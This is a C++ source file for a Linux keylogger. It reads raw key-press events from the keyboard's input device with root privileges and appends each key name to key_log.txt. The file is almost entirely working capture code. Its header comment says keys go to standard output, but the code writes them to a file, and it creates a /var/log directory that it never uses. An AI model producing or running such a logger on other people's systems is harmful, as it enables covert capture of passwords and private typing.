/******************************************************************************
 * How it works:
 * 1.  Finds the correct event device for the keyboard by parsing
 * /proc/bus/input/devices. It looks for a device that has the
 * capabilities of a standard keyboard.
 * 2.  Opens the identified event device file for reading. This requires root
 * privileges.
 * 3.  Enters an infinite loop to read `input_event` structs from the device.
 * 4.  Filters for events that are key presses (type EV_KEY and value 1).
 * 5.  Maps the raw key code to a human-readable string.
 * 6.  Prints the name of the pressed key to the standard output.
 ******************************************************************************/

#include <fcntl.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <linux/input.h>
#include <map>
#include <stdexcept>
#include <string>
#include <unistd.h>

#include "util.h"


// Finds the keyboard device event file from /proc/bus/input/devices.
// It looks for a device with EV=120013, which is typical for a keyboard.


int main() {
    int fd;
    input_event ev{};

    try {
        std::string device_path = find_keyboard_device();
        std::cout << "Found keyboard device at: " << device_path << std::endl;
        std::cout << "Starting to listen for key presses... (Press Ctrl+C to exit)"
                << std::endl;

        fd = open(device_path.c_str(), O_RDONLY);
        if (fd == -1) {
            throw std::runtime_error(
                "Cannot open device file. Are you running as root?");
        }
        std::string keyLogDir = "/var/log";
        if (!std::filesystem::exists(keyLogDir)) {
            try {
                std::filesystem::create_directories(keyLogDir);
            } catch (const std::filesystem::filesystem_error &e) {
                std::cerr << "Error creating directory " << keyLogDir << ": " << e.what() <<
                        std::endl;
                return 1;
            }
        }

        while (true) {
            // Read an input event from the device file
            ssize_t bytes = read(fd, &ev, sizeof(input_event));

            if (bytes == sizeof(input_event)) {
                // We are only interested in key press events
                // ev.type == EV_KEY means it's a key or button event
                // ev.value == 1 means the key was pressed down
                // ev.value == 0 means the key was released
                // ev.value == 2 means the key is being held down (autorepeat)
                if (ev.type == EV_KEY && ev.value == 1) {
                    std::ofstream keylog("key_log.txt", std::ios::app);
                    if (!keylog.is_open()) {
                        perror("file");
                        return 1;
                    }

                    keylog << "Key Pressed: " << key_code_to_string(ev.code) << '\n';
                    keylog.close();
                }
            } else if (bytes < 0) {
                // An error occurred
                perror("read");
                close(fd);
                return 1;
            }
        }
    } catch (const std::exception &e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
}
